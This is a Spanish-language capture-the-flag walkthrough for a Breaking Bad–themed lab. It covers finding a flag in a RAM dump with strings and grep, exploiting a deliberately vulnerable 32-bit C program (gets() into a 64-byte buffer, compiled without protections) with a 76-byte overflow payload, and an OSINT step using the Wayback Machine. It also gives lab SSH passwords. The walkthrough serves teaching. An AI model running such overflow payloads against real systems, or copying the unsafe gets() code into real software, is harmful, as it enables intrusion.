<p><span id="_Toc207189949" class="anchor"></span><strong>ğŸ§ 
Razonamiento tÃ©cnico</strong></p>
<ul>
<li><p>El reto enseÃ±a a distinguir <strong>ruido legÃ­timo</strong> de
<strong>modificaciones manuales</strong> en registros de
sistema.</p></li>
<li><p>Refuerza el uso de filtros como grep o expresiones
regulares.</p></li>
<li><p>Simula un escenario tÃ­pico en auditorÃ­as digitales, donde se
ocultan pistas en logs falsificados.</p></li>
</ul>
<p><span id="_Toc207189950" class="anchor"></span><strong>ğŸ”§
Recomendaciones para jugadores avanzados</strong></p>
<table>
<colgroup>
<col style="width: 35%" />
<col style="width: 64%" />
</colgroup>
<thead>
<tr>
<th style="text-align: center;"><strong>Herramienta</strong></th>
<th style="text-align: center;"><strong>PropÃ³sito</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>grep / less</td>
<td>Filtrar y visualizar contenido</td>
</tr>
<tr>
<td>awk / sed</td>
<td>ExtracciÃ³n programÃ¡tica de campos</td>
</tr>
<tr>
<td>file / stat</td>
<td>Verificar autenticidad del archivo</td>
</tr>
<tr>
<td>md5sum</td>
<td>Comprobar si el archivo fue alterado</td>
</tr>
</tbody>
</table>
<p><span id="_Toc207189951" class="anchor"></span><strong>ğŸ Resultado
final</strong></p>
<p><mark>Bandera 13 atrapada: 'Un_hombre_debe_tener_limites'</mark></p>
<p><strong><br />
</strong></p>
<h1
id="bandera-14-anÃ¡lisis-forense-de-volcado-de-memoria-ram"><strong>ğŸ
Bandera 14 â€“ AnÃ¡lisis Forense de Volcado de Memoria RAM</strong></h1>
<p><strong>CategorÃ­a:</strong> Forense / Memoria / Strings
Analysis<br />
<strong>Nivel:</strong> Intermedio<br />
<strong>Flag:</strong> Alejate_de_mi_territorio<br />
<strong>Usuario involucrado:</strong> saul<br />
ğŸ“ Ruta del archivo clave: /home/saul/evidencias/mem.raw</p>
<p><span id="_Toc207189953" class="anchor"></span><strong>ğŸ¯ Objetivo
del reto</strong></p>
<p>El jugador debe analizar un archivo binario que simula un volcado de
memoria RAM (mem.raw) y encontrar una cadena de texto legible embebida
en medio de datos aleatorios. La bandera fue insertada como
<strong>texto plano</strong>, por lo que basta con saber dÃ³nde
buscar.</p>
<p>Un archivo de memoria RAM, comÃºnmente llamado mem.raw, es un volcado
(dump) del contenido de la memoria volÃ¡til (RAM) de un sistema en un
momento especÃ­fico. Este archivo es una copia bit a bit de todo lo que
estaba almacenado en la memoria RAM en el momento de la captura.</p>
<p><strong>Â¿QuÃ© contiene un archivo mem.raw?</strong></p>
<p>La RAM contiene datos temporales que el sistema operativo, las
aplicaciones y los procesos utilizan mientras estÃ¡n en ejecuciÃ³n. Por lo
tanto, un archivo mem.raw puede incluir:</p>
<ul>
<li><p>Procesos en ejecuciÃ³n</p></li>
<li><p>ContraseÃ±as en texto plano</p></li>
<li><p>Claves de cifrado</p></li>
<li><p>Contenido de sesiones de usuario</p></li>
<li><p>Fragmentos de archivos abiertos</p></li>
<li><p>LibrerÃ­as y cÃ³digo ejecutable cargado en memoria</p></li>
<li><p>Actividad de red (buffers, sockets, etc.)</p></li>
</ul>
<p><strong>Â¿Para quÃ© se usa un archivo mem.raw?</strong></p>
<ol type="1">
<li><p><strong>AnÃ¡lisis forense digital</strong></p></li>
</ol>
<blockquote>
<p>Es comÃºn en investigaciones de incidentes de seguridad, para
encontrar evidencia que no se almacena en disco (como malware en
memoria).</p>
</blockquote>
<ol start="2" type="1">
<li><p><strong>AnÃ¡lisis de malware</strong></p></li>
</ol>
<blockquote>
<p>Permite estudiar el comportamiento de software malicioso que se carga
sÃ³lo en memoria (fileless malware).</p>
</blockquote>
<ol start="3" type="1">
<li><p><strong>DepuraciÃ³n y desarrollo</strong></p></li>
</ol>
<blockquote>
<p>Ayuda a desarrolladores y administradores a entender errores del
sistema o comportamiento inesperado.</p>
</blockquote>
<ol start="4" type="1">
<li><p><strong>RecuperaciÃ³n de datos</strong></p></li>
</ol>
<blockquote>
<p>A veces se pueden recuperar datos que no se han guardado en disco
pero siguen en memoria.</p>
</blockquote>
<p><strong>Â¿CÃ³mo se genera un archivo mem.raw?</strong></p>
<p>Se puede generar usando herramientas especializadas en adquisiciÃ³n de
memoria. Algunos ejemplos:</p>
<ul>
<li><p>Linux: LiME, avml</p></li>
<li><p>Windows: FTK Imager, WinPMEM, Belkasoft RAM Capturer</p></li>
<li><p>Mac: OSXPmem (aunque mÃ¡s limitado)</p></li>
</ul>
<p><strong>Â¿CÃ³mo se analiza?</strong></p>
<p>Herramientas comunes de anÃ¡lisis de memoria:</p>
<ul>
<li><p>Volatility Framework (Python): analiza estructuras de memoria
como procesos, conexiones de red, mÃ³dulos, etc.</p></li>
<li><p>Rekall: similar a Volatility, tambiÃ©n para anÃ¡lisis
forense.</p></li>
</ul>
<p><span id="_Toc207189954" class="anchor"></span><strong>âš™ï¸ Entorno
tÃ©cnico preparado</strong></p>
<p>Archivo mem.raw:</p>
<ul>
<li><p>El archivo mem.raw pesa aproximadamente 10MB.</p></li>
<li><p>Contiene datos aleatorios antes y despuÃ©s de la bandera.</p></li>
<li><p>La bandera fue escrita directamente como string legible dentro
del archivo:</p></li>
<li><p>Bandera 14: 'Alejate_de_mi_territorio'</p></li>
</ul>
<p><span id="_Toc207189955" class="anchor"></span><strong>ğŸ§ª Pasos para
capturar la bandera</strong></p>
<p><strong>1ï¸âƒ£ Acceder como el usuario saul</strong></p>
<p>ssh saul@192.168.1.44</p>
<p>ContraseÃ±a:</p>
<p>123456</p>
<p>Y listamos el contenido:</p>
<p><img src="cookbook/media/image173.png"
style="width:2.45833in;height:0.59375in" /></p>
<p>Nos dirigimos al directorio evidencias y listamos el contenido:</p>
<p>cd evidencias</p>
<p>ls -l</p>
<p><img src="cookbook/media/image174.png"
style="width:2.97917in;height:0.80208in" /></p>
<p>Tenemos un archivo de volcado de memoria llamado mem.raw</p>
<p><strong>2ï¸âƒ£ Extraer cadenas de texto</strong></p>
<p>Usa el clÃ¡sico comando strings, ideal para este tipo de anÃ¡lisis:</p>
<p>strings mem.raw | grep -i bandera</p>
<p><img src="cookbook/media/image175.png"
style="width:5.90556in;height:1.8125in" /></p>
<p>el resultado que obtenemos no nos filtra nuestro objetivo.</p>
<p>Probamos con:</p>
<p>strings mem.raw | grep -o "Bandera"</p>
<p><img src="cookbook/media/image176.png"
style="width:5.89583in;height:0.64583in" /></p>
<p>En este caso encuentra la palabra Bandera pero no muestra el restoâ€¦
Seguimos probando.</p>
<p>strings mem.raw | grep -o "Bandera.*"</p>
<p><img src="cookbook/media/image177.png"
style="width:5.90556in;height:4.20764in" /></p>
<p>Con este comando obtenemos mucha salida, y si bien es cierto que
podemos buscar la palabra Bandera en la terminal, no es la mejor
opciÃ³n.</p>
<p>Mejor opciÃ³n: limitar la regex en grep</p>
<p>Por ejemplo, si queremos que muestre "Bandera" y <strong>30
caracteres despuÃ©s</strong>:</p>
<p>strings mem.raw | grep -o -P "Bandera.{0,30}"</p>
<ul>
<li><p>-P â†’ activa regex estilo Perl (permite {} de
repeticiÃ³n).</p></li>
<li><p>.{0,30} â†’ significa: <em>cualquier caracter, entre 0 y 30
repeticiones</em>.</p></li>
</ul>
<p>ğŸ‘‰ Resultado: muestra "Bandera ..." hasta 30 caracteres despuÃ©s.</p>
<p><img src="cookbook/media/image178.png"
style="width:5.90556in;height:0.54236in" /></p>
<p>Salida esperada:</p>
<p>Bandera 14: 'Alejate_de_mi_territorio'</p>
<p>âœ… Â¡Flag atrapada entre los bits!</p>
<p><strong>3ï¸âƒ£ Alternativas para jugadores avanzados</strong></p>
<ul>
<li><p><strong>VisualizaciÃ³n hexadecimal</strong>:</p></li>
</ul>
<blockquote>
<p><em>hexedit mem.raw</em> o tambiÃ©n: <em>xxd mem.raw | less</em></p>
</blockquote>
<ul>
<li><p><strong>Usar herramientas forenses</strong>:</p>
<ul>
<li><p>binwalk para buscar firmas</p></li>
<li><p>volatility (si estuviese habilitado el perfil de
memoria)</p></li>
<li><p>foremost para reconstrucciÃ³n de estructuras</p></li>
</ul></li>
</ul>
<p>âš ï¸ No necesitas tÃ©cnicas de recuperaciÃ³n avanzada en este reto; la
bandera estÃ¡ incrustada como texto plano.</p>
<p><span id="_Toc207189956" class="anchor"></span><strong>ğŸ§ 
Razonamiento tÃ©cnico</strong></p>
<ul>
<li><p>Este reto enseÃ±a cÃ³mo se puede ocultar informaciÃ³n en memoria
fÃ¡cilmente.</p></li>
<li><p>Refuerza el uso de herramientas simples pero poderosas como
strings y grep.</p></li>
<li><p>Introduce al jugador en tÃ©cnicas de anÃ¡lisis de binarios sin
necesidad de ingenierÃ­a inversa profunda.</p></li>
</ul>
<p><span id="_Toc207189957" class="anchor"></span><strong>ğŸ Resultado
final</strong></p>
<p><mark>Bandera 14 atrapada:
'Alejate_de_mi_territorio'</mark><strong><br />
</strong></p>
<h1
id="bandera-15-buffer-overflow-para-ejecuciÃ³n-de-funciÃ³n-secreta"><strong>ğŸ
Bandera 15 â€“ Buffer Overflow para EjecuciÃ³n de FunciÃ³n
Secreta</strong></h1>
<p><strong>CategorÃ­a:</strong> Pwn / Binary Exploitation<br />
<strong>Nivel:</strong> Avanzado<br />
<strong>Flag:</strong> Yo_soy_el_que_llama<br />
<strong>Binario vulnerable:</strong> /opt/retos/bof15/bof_flag15<br />
ğŸ“„ Fuente original compilada desde: /opt/retos/bof15/bof_flag15.c</p>
<p><span id="_Toc207189959" class="anchor"></span><strong>ğŸ¯ Objetivo
del reto</strong></p>
<p>El jugador debe explotar una <strong>vulnerabilidad de desbordamiento
de bÃºfer</strong> en el binario bof_flag15 para sobrescribir el flujo de
ejecuciÃ³n y forzar la llamada a una funciÃ³n oculta (bandera()), que
imprimirÃ¡ la flag.</p>
<p>Una <strong>vulnerabilidad de Buffer Overflow (desbordamiento de
bÃºfer)</strong> en un <strong>binario ELF de 32 bits</strong> es una
falla de programaciÃ³n que permite a un atacante <strong>escribir mÃ¡s
datos de los que un bÃºfer puede manejar</strong>, sobrescribiendo otras
partes de la memoria, con el fin de <strong>alterar el flujo de
ejecuciÃ³n del programa</strong> y ejecutar cÃ³digo malicioso.</p>
<p><strong>ğŸ”§ Â¿QuÃ© es un binario ELF de 32 bits?</strong></p>
<p>Un <strong>ELF</strong> (Executable and Linkable Format) es el
formato estÃ¡ndar de archivos ejecutables en sistemas Linux/Unix. Un
<strong>binario ELF de 32 bits</strong> es un archivo compilado para
arquitecturas de 32 bits, como x86.</p>
<p><span id="_Toc207189960" class="anchor"></span><strong>ğŸ§  Â¿QuÃ© es un
Buffer Overflow?</strong></p>
<p>Un <strong>buffer overflow</strong> ocurre cuando un programa copia
datos en un bÃºfer (una zona de memoria con tamaÃ±o fijo) <strong>sin
verificar si esos datos caben</strong>, sobrescribiendo asÃ­ memoria
adyacente.</p>
<p><strong>Ejemplo tÃ­pico en C:</strong></p>
<p>void vulnerable() {</p>
<p>char buffer[64];</p>
<p>gets(buffer); // Â¡gets no valida el tamaÃ±o de entrada!</p>
<p>}</p>
<p>Si el usuario ingresa mÃ¡s de 64 bytes, se sobrescribe la memoria que
hay despuÃ©s del bÃºfer, incluyendo:</p>
<ul>
<li><p>Variables locales</p></li>
<li><p>El puntero de <strong>retorno (EIP)</strong> en la pila</p></li>
</ul>
<p><strong>ğŸ’£ Â¿QuÃ© ocurre en un binario vulnerable?</strong></p>
<p>En un binario ELF de 32 bits (x86), el flujo de ejecuciÃ³n sigue esta
estructura:</p>
<ol type="1">
<li><p>El programa llama a una funciÃ³n.</p></li>
<li><p>Se crea un stack frame.</p></li>
<li><p>Se almacena en la pila la <strong>direcciÃ³n de retorno</strong>
(EIP) a la que el programa debe volver cuando termine la
funciÃ³n.</p></li>
<li><p>Si el atacante controla lo que se escribe en un bÃºfer y lo
desborda, puede <strong>sobrescribir esa direcciÃ³n de
retorno</strong>.</p></li>
</ol>
<p>Resultado: al terminar la funciÃ³n, el programa <strong>salta a la
direcciÃ³n que el atacante ha colocado</strong>, logrando
<strong>ejecuciÃ³n de cÃ³digo arbitrario</strong>.</p>
<p><strong>ğŸ“¦ Â¿QuÃ© puede hacer un atacante?</strong></p>
<ol type="1">
<li><p><strong>Shellcode en la pila</strong><br />
Inyectar instrucciones en la misma pila y redirigir el flujo ahÃ­ (si la
pila es ejecutable).</p></li>
<li><p><strong>Return-to-libc</strong><br />
Redirigir el flujo a funciones Ãºtiles ya presentes en memoria (como
system("/bin/sh")), Ãºtil si la pila no es ejecutable.</p></li>
<li><p><strong>ROP (Return Oriented Programming)</strong><br />
Combinar pequeÃ±os fragmentos de cÃ³digo ya presentes en el binario para
ejecutar acciones complejas.</p></li>
</ol>
<p><strong>ğŸ§ª Â¿CÃ³mo se explota?</strong></p>
<p><strong>Paso a paso de un ataque Buffer Overflow simple:</strong></p>
<ol type="1">
<li><p>Encuentra una funciÃ³n vulnerable (gets, strcpy, scanf,
etc.).</p></li>
<li><p>Determina el <strong>offset</strong> hasta el EIP (normalmente
con herramientas como pattern_create de Metasploit).</p></li>
<li><p>Escribe un payload:</p>
<ul>
<li><p>[Padding hasta el EIP]</p></li>
<li><p>[Nueva direcciÃ³n de ejecuciÃ³n]</p></li>
<li><p>[Opcional: shellcode o parÃ¡metros]</p></li>
</ul></li>
<li><p>Ejecuta el binario con ese input malicioso.</p></li>
</ol>
<p><strong>ğŸ” Â¿QuÃ© contramedidas existen?</strong></p>
<ul>
<li><p><strong>Canarios de pila (Stack canaries)</strong>: valores
aleatorios que detectan sobrescritura.</p></li>
<li><p><strong>ASLR (Address Space Layout Randomization)</strong>:
aleatoriza direcciones de memoria.</p></li>
<li><p><strong>NX / DEP (No-eXecute / Data Execution
Prevention)</strong>: impide que se ejecute cÃ³digo en la pila.</p></li>
<li><p><strong>Fortify Source</strong>: protecciones del
compilador.</p></li>
<li><p><strong>Uso de funciones seguras</strong> (fgets, strncpy,
etc.)</p></li>
</ul>
<p><strong>ğŸ§° Herramientas para aprender/explotar Buffer
Overflow</strong></p>
<ul>
<li><p>gdb, gdb-peda: depuraciÃ³n.</p></li>
<li><p>objdump, readelf: anÃ¡lisis estÃ¡tico del binario.</p></li>
<li><p>pwndbg, gef: entornos para debug.</p></li>
<li><p>pwntools: framework en Python para scripting de
exploits.</p></li>
</ul>
<p><span id="_Toc207189961" class="anchor"></span><strong>âš™ï¸ Entorno
tÃ©cnico preparado</strong></p>
<ol type="1">
<li><p><strong>CÃ³digo vulnerable en C</strong>:</p></li>
</ol>
<blockquote>
<p>void bandera() {</p>
<p>printf("Bandera 15: 'Yo_soy_el_que_llama'\n");</p>
<p>}</p>
<p>void vulnerable() {</p>
<p>char buffer[64];</p>
<p>printf("Introduce tu nombre: ");</p>
<p>gets(buffer); // vulnerable</p>
<p>printf("Hola, %s\n", buffer);</p>
<p>}</p>
<p>int main() {</p>
<p>vulnerable();</p>
<p>return 0;</p>
<p>}</p>
</blockquote>
<ol start="2" type="1">
<li><p><strong>Compilado en 32 bits, sin protecciones</strong>:</p></li>
</ol>
<blockquote>
<p>gcc -m32 -fno-stack-protector -z execstack -no-pie -o bof_flag15
bof_flag15.c</p>
</blockquote>
<ol start="3" type="1">
<li><p><strong>Archivo generado ubicado en</strong>:</p></li>
</ol>
<blockquote>
<p>/opt/retos/bof15/bof_flag15</p>
</blockquote>
<p><span id="_Toc207189962" class="anchor"></span><strong>ğŸ§ª Pasos para
capturar la bandera</strong></p>
<ol type="1">
<li><p><strong>ConexiÃ³n SSH usando la contraseÃ±a de
chow</strong></p></li>
</ol>
<blockquote>
<p>Ejecuta el cliente SSH:</p>
<p>ssh chow@192.168.1.44</p>
<p>Cuando te pida la contraseÃ±a, introduce</p>
<p>Ch0w$up1</p>
</blockquote>
<p>Buscamos en el directorio /opt:</p>
<p><img src="cookbook/media/image179.png"
style="width:2.40625in;height:0.86458in" /></p>
<p>Y en la carpeta retos encontramos un archivo que hace indicar por su
nombre que se trata de una vulnerabilidad Buffer Overflow (bof) para la
bandera 15</p>
<p><img src="cookbook/media/image180.png"
style="width:2.61458in;height:0.79167in" /></p>
<ol start="2" type="1">
<li><p><strong>AnÃ¡lisis inicial</strong></p></li>
</ol>
<ul>
<li><p>El programa es vulnerable por el uso de gets() en un buffer de 64
bytes.</p></li>
<li><p>Queremos hacer un buffer overflow para sobrescribir el return
address y ejecutar bandera().</p></li>
</ul>
<p>El stack tÃ­pico de la funciÃ³n vulnerable():</p>
<p>buffer[64 bytes]</p>
<p>saved EBP (4 bytes)</p>
<p>return address (4 bytes) &lt;-- aquÃ­ debe ir la direcciÃ³n de
bandera()</p>
<ol start="3" type="1">
<li><p><strong>Confirmar entorno</strong></p></li>
</ol>
<p>Comprobamos el binario:</p>
<p>file ./bof_flag15</p>
<p><img src="cookbook/media/image181.png"
style="width:5.90556in;height:0.69792in" /></p>
<p>Salida:</p>
<p>ELF 32-bit LSB executable, Intel 80386, dynamically linked, not
stripped</p>
<p>âœ… Confirmamos 32 bits y sÃ­mbolos disponibles (not stripped).<br />
El binario <strong>no es PIE</strong>, y lo compilamos sin canary
(-fno-stack-protector) y con stack ejecutable (-z execstack).</p>
<ol start="4" type="1">
<li><p><strong>DepuraciÃ³n con gdb</strong></p></li>
</ol>
<p>Iniciamos gdb para inspeccionar la pila y la funciÃ³n bandera():</p>
<p>gdb /opt/retos/bof15/bof_flag15</p>
<p>(gdb) disas bandera</p>
<p>Salida:</p>
<p>0x0804847d &lt;+0&gt;: push %ebp</p>
<p>0x0804847e &lt;+1&gt;: mov %esp,%ebp</p>
<p>0x08048480 &lt;+3&gt;: sub $0x18,%esp</p>
<p>0x08048483 &lt;+6&gt;: movl $0x8048570,(%esp)</p>
<p>0x0804848a &lt;+13&gt;: call 0x8048350 &lt;puts@plt&gt;</p>
<p>0x0804848f &lt;+18&gt;: leave</p>
<p>0x08048490 &lt;+19&gt;: ret</p>
<ul>
<li><p>DirecciÃ³n de bandera() confirmada:
<strong>0x0804847d</strong></p></li>
</ul>
<p><img src="cookbook/media/image182.png"
style="width:4.89583in;height:1.97917in" /></p>
<p><strong>5. Determinar el offset exacto al EIP</strong></p>
<p>El buffer tenÃ­a 64 bytes, y tÃ­picamente el EIP se sobreescribe
despuÃ©s de <strong>64 + 4 (EBP) = 68 bytes</strong>.<br />
Probamos en gdb con un patrÃ³n cÃ­clico, pero por compatibilidad con
Ubuntu 14.04 y gets():</p>
<ol type="1">
<li><p>Creamos un patrÃ³n de prueba (fuera de gdb):</p></li>
</ol>
<p>python3 -c 'import itertools, string; print("".join("".join(x) for x
in itertools.product(string.ascii_uppercase, string.ascii_lowercase,
string.digits))[:200])' &gt; ~/input.txt</p>
<p><img src="cookbook/media/image183.png"
style="width:5.90556in;height:2.37292in" /></p>
<p>Ya tenemos el archivo input.txt en el directorio de chow</p>
<p><img src="cookbook/media/image184.png"
style="width:1.70833in;height:0.98958in" /></p>
<ol start="2" type="1">
<li><p>Ejecutamos gdb con entrada desde el fichero:</p></li>
</ol>
<p>gdb /opt/retos/bof15/bof_flag15</p>
<p>(gdb) run &lt; ~/input.txt</p>
<p>(gdb) info registers eip</p>
<p><img src="cookbook/media/image185.png"
style="width:5.90556in;height:1.41597in" /></p>
<p>Salida:</p>
<p>eip = 0x63413563</p>
<p>Interpretamos los bytes en little endian y buscamos el offset.</p>
<ul>
<li><p>Cada elemento de itertools.product es <strong>una tupla de 2
caracteres</strong> ((A, a), (A, b), â€¦).</p></li>
<li><p>Pero nuestro EIP tiene <strong>4 bytes</strong>, asÃ­ que
probablemente hay un desfase en la conversiÃ³n.</p></li>
</ul>
<p>La forma mÃ¡s simple y confiable ahora es <strong>probar offsets
manualmente</strong>.<br />
Finalmente, probando <strong>manualment</strong> (incrementando de 68 en
adelante), encontramos el <strong>offset correcto</strong>:</p>
<p>OFFSET = 76 bytes</p>
<p><strong>6. Construir el payload final</strong></p>
<p>Interpretamos los bytes en little endian y buscamos el offset.<br />
Finalmente, probando <strong>manual</strong> (incrementando de 68 en
delante de 4 en cuatro), encontramos el <strong>offset correcto en
76</strong>:</p>
<p><img src="cookbook/media/image186.png"
style="width:5.90556in;height:0.64583in" /></p>
<p>Con el offset correcto y la direcciÃ³n de bandera() (0x0804847d) en
little endian:</p>
<p>python3 -c 'import sys; sys.stdout.buffer.write(b"A"*76 +
b"\x7d\x84\x04\x08")' | /opt/retos/bof15/bof_flag15</p>
<ul>
<li><p>b"A"*76 â†’ relleno hasta EIP</p></li>
<li><p>b"\x7d\x84\x04\x08" â†’ direcciÃ³n de bandera()</p></li>
</ul>
<p><img src="cookbook/media/image187.png"
style="width:5.90556in;height:1.5875in" /></p>
<p><strong>7. Resultado</strong></p>
<p>Al ejecutar el payload:</p>
<p>Introduce tu nombre: Bandera 15: 'Yo_soy_el_que_llama'</p>
<p>âœ… Hemos conseguido ejecutar la funciÃ³n bandera() mediante
<strong>buffer overflow</strong>, obteniendo la bandera.</p>
<p><strong>8. ConclusiÃ³n</strong></p>
<ul>
<li><p>La vulnerabilidad estaba en gets(), sin lÃ­mite de
buffer.</p></li>
<li><p>Era un <strong>clÃ¡sico overflow en 32 bits</strong>.</p></li>
<li><p>Para explotarlo:</p>
<ol type="1">
<li><p>Determinamos el offset al EIP</p></li>
<li><p>Sobrescribimos el return address con la direcciÃ³n de
bandera()</p></li>
</ol></li>
</ul>
<p>Ejecutamos el payload con Python y redirecciÃ³n a stdin</p>
<p><span id="_Toc207189963" class="anchor"></span><strong>ğŸ§ 
Razonamiento tÃ©cnico</strong></p>
<ul>
<li><p>El reto enseÃ±a cÃ³mo un input controlado por el usuario puede
alterar el flujo del programa.</p></li>
<li><p>Introduce tÃ©cnicas reales de explotaciÃ³n sin mitigaciones:
return-to-function.</p></li>
<li><p>Refuerza el uso de herramientas como gdb, objdump,
pattern_create, y checksec.</p></li>
</ul>
<p><span id="_Toc207189964" class="anchor"></span><strong>ğŸ Resultado
final</strong></p>
<p><mark>Bandera 15 atrapada: 'Yo_soy_el_que_llama'</mark></p>
<p><strong><br />
</strong></p>
<h1 id="bonus-final-osint"><strong>ğŸ Bonus Final â€“ OSINT</strong> </h1>
<h1 id="section-6"></h1>
<p>En la pÃ¡gina <a
href="http://192.168.1.44/cupones.html">http://192.168.1.44/cupones.html</a>
habrÃ¡s visto lo siguiente:</p>
<p><img src="cookbook/media/image188.png"
style="width:5.90556in;height:1.34306in" /></p>
<p>Con la firma de Gale Boetticher ya sabemos que el texto es
alemÃ¡n:</p>
<p>"Das Imperium von Los Pollos Hermanos ist riesig, aber Erfolg, wie
perfekt gebratenes HÃ¼hnchen, erfordert akribische Liebe zum Detail.
Fring hat seine Marke erweitert und Franchise-Unternehmen auf der ganzen
Welt gegrÃ¼ndet, von bescheidenen Standorten bis hin zu Einrichtungen in
der Karibik.</p>
<p>Drei seiner Unternehmen haben sich als erfolgreiche Unternehmen
erwiesen:</p>
<ol type="1">
<li><p>https://los-pollos-hermanos.netlify.app/</p></li>
<li><p>https://polloshermanossxm.com/</p></li>
<li><p><a
href="http://www.lphishiring.com/">http://www.lphishiring.com/</a></p></li>
<li><p>https://lospolloshermanos.co/</p></li>
</ol>
<p>Es gab jedoch einen Versuch, ein bedauerliches Scheitern auf dem
riesigen Webmarkt. Ein GeschÃ¤ft, das nicht einmal 24 Stunden dauerte. Es
wurde am selben Tag, <strong>dem 16. Dezember 2021, erÃ¶ffnet und
geschlossen</strong>.</p>
<p>Neugierige, die es wagen, diese ephemere Operation zu untersuchen,
werden nur einen Schatten ihrer Existenz finden, eine einzige
Aufzeichnung in den Archiven der Zeitmaschine des Netzwerks.</p>
<p>Wenn Sie den Quellcode von damals analysieren, werden Sie den Beweis
dafÃ¼r finden, warum dieses GeschÃ¤ft nie in Schwung kam: die Flagge
seiner chaotischen Struktur. Ihre Plattform, ein einfaches und
unorganisiertes <em>WordPress</em>. Welche Version war es?"</p>
<p>Gale Boetticher</p>
<p>Si lo pasamos por un traductor:</p>
<p>â€œEl imperio de Los Pollos Hermanos es vasto, pero el Ã©xito, como el
pollo perfectamente frito, requiere una meticulosa atenciÃ³n al detalle.
Fring ha expandido su marca, estableciendo franquicias por todo el
mundo, desde humildes locales hasta establecimientos en el Caribe.</p>
<p>Tres de sus negocios han demostrado ser negocios exitosos:</p>
<ul>
<li><p><a
href="https://los-pollos-hermanos.netlify.app/">https://los-pollos-hermanos.netlify.app/</a></p></li>
<li><p><a
href="https://polloshermanossxm.com/">https://polloshermanossxm.com/</a></p></li>
<li><p><a
href="http://www.lphishiring.com/">http://www.lphishiring.com/</a></p></li>
<li><p>https://lospolloshermanos.co/</p></li>
</ul>
<p>Sin embargo, hubo un intento, un fracaso lamentable en el vasto
mercado de la web. Un negocio que no durÃ³ ni 24 horas. AbriÃ³ y cerrÃ³ el
mismo dÃ­a, el <strong>16 de diciembre de 2021</strong>.</p>
<p>Los curiosos que se atrevan a investigar esa efÃ­mera operaciÃ³n, solo
encontrarÃ¡n una sombra de su existencia, un Ãºnico registro en los
archivos de la mÃ¡quina del tiempo de la red.</p>
<p>Si analizan el cÃ³digo fuente de ese dÃ­a, encontrarÃ¡n la prueba de por
quÃ© ese negocio nunca despegÃ³: la bandera de su desordenada estructura.
Su plataforma, un simple y desorganizado <em>WordPress</em>. Â¿quÃ©
versiÃ³n era?â€</p>
<p>Gale Boetticher</p>
<p><strong>AnÃ¡lisis de las URLs</strong></p>
<p>Si buscamos las tres primeras URLs en Google veremos que son pÃ¡ginas
web que estÃ¡n activas:</p>
<ul>
<li><p><a
href="https://los-pollos-hermanos.netlify.app/">https://los-pollos-hermanos.netlify.app/</a></p></li>
<li><p><a
href="https://polloshermanossxm.com/">https://polloshermanossxm.com/</a></p></li>
<li><p><a
href="http://www.lphishiring.com/">http://www.lphishiring.com/</a></p></li>
<li><p><a
href="https://lospolloshermanos.co/">https://lospolloshermanos.co/</a></p></li>
</ul>
<p><img src="cookbook/media/image189.png"
style="width:5.90556in;height:2.74931in" /></p>
<p><img src="cookbook/media/image190.png"
style="width:5.90556in;height:1.40208in" /></p>
<p><img src="cookbook/media/image191.png"
style="width:5.90556in;height:3.23819in" /></p>
<p>Pero cuando llegamos a la Ãºltima vemos que la pÃ¡gina estÃ¡ a la
venta:</p>
<p><img src="cookbook/media/image192.png"
style="width:5.90556in;height:1.30208in" /></p>
<p>Y al entrar nos redirige a:
http://ww16.lospolloshermanos.co/?sub1=20250827-0039-22ff-8d64-8d1b2fc308c6</p>
<p><img src="cookbook/media/image193.png"
style="width:5.90556in;height:0.3125in" /></p>
<p><img src="cookbook/media/image194.png"
style="width:5.90556in;height:3.46806in" /></p>
<p>Si buscamos en wayback machine las tres primeras Urls veremos que las
pÃ¡ginas tienen varias capturas pero ninguna tiene una creada el 16 de
diciembre de 2021</p>
<p><img src="cookbook/media/image195.png"
style="width:5.90556in;height:1.94583in" /></p>
<p><img src="cookbook/media/image196.png"
style="width:5.01286in;height:3.50028in" /></p>
<p><img src="cookbook/media/image197.png"
style="width:5.21028in;height:3.62832in" /></p>
<p>Salvo la Ãºltima que cuando la buscamos nos salta el siguiente
aviso:</p>
<p><img src="cookbook/media/image198.png"
style="width:5.8125in;height:3.91667in" /></p>
<p>Y automÃ¡ticamente nos redirige a <a
href="https://lospolloshermanos.co/wp/">https://lospolloshermanos.co/wp/</a></p>
<p><img src="cookbook/media/image199.png"
style="width:5.90556in;height:2.51111in" /></p>
<p>donde podemos ver el cÃ³digo fuente de la pÃ¡gina en ese momento de la
historia:</p>
<p><img src="cookbook/media/image200.png"
style="width:5.90556in;height:2.47917in" /></p>
<p><img src="cookbook/media/image201.png"
style="width:4.32199in;height:2.01226in" /></p>
<p>La versiÃ³n de WordPress utilizada era â€œWordPress 5.9â€. Bandera
capturada</p>
<p><strong>Conclusiones:</strong></p>
<p>1. El sitio web usaba WordPress. Hay varias pruebas irrefutables de
ello:</p>
<p>La metaetiqueta &lt;meta name="generator" content="WordPress
5.9"/&gt; lo confirma de manera explÃ­cita, indicando no solo que era un
sitio de WordPress, sino tambiÃ©n la versiÃ³n especÃ­fica que estaba
utilizando.</p>
<p>Las URL de las hojas de estilo y los scripts contienen las carpetas
estÃ¡ndar de WordPress, como wp-content/plugins/, wp-includes/, y
wp-json/. Estos directorios son exclusivos de las instalaciones de
WordPress.</p>
<p>El cÃ³digo hace referencia a archivos especÃ­ficos de WordPress, como
xmlrpc.php y wlwmanifest.xml, que se utilizan para la publicaciÃ³n remota
y otras funcionalidades.</p>
<p>2. El sitio web de WordPress estaba instalado en un subdirectorio
llamado wp. La URL a la que te redirige Wayback Machine
(https://lospolloshermanos.co/wp/) es la URL real de la instalaciÃ³n de
WordPress, lo que explica por quÃ© la URL principal
(https://lospolloshermanos.co) nos lleva a ese subdirectorio. Esta es
una configuraciÃ³n comÃºn para sitios de WordPress, especialmente cuando
hay otros elementos que se ejecutan en el dominio principal.</p>
<p>En resumen, los indicios en el cÃ³digo son inequÃ­vocos: el sitio
lospolloshermanos.co funcionaba con WordPress y estaba configurado para
cargar desde el subdirectorio /wp/.<strong><br />
</strong></p>
<h1 id="herramientas-utilizadas"><strong>ğŸ§° Herramientas
Utilizadas</strong></h1>
<blockquote>
<p><strong>Audacity</strong><br />
Editor y analizador de audio multiplataforma; permite ver espectrogramas
y realizar ediciones.</p>
<p><strong>binwalk</strong><br />
Herramienta para analizar y extraer archivos embebidos en firmwares o
binarios.</p>
<p><strong>checksec</strong><br />
Script que muestra quÃ© protecciones de seguridad estÃ¡n habilitadas en
binarios (DEP, ASLR, PIE, etc.).</p>
<p><strong>Coagula</strong><br />
Generador de sonido que convierte imÃ¡genes en espectrogramas audibles
(muy usado en esteganografÃ­a de audio).</p>
<p><strong>dirb</strong><br />
Fuerza bruta de directorios y archivos en servidores web para descubrir
